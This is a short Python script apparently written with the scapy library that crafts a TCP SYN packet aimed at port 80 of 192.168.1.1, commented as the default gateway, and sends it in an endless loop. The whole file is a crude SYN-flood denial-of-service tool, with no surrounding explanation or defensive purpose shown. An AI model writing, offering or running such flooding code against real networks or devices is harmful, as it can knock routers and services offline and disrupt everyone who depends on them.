from scapy.all import *
 
target_ip = "192.168.1.1"#deafult gateway   
target_port = 80

ip_layer = IP(dst=target_ip)   
tcp_layer = TCP(dport=target_port, flags="S")

send(ip_layer/tcp_layer, loop=1)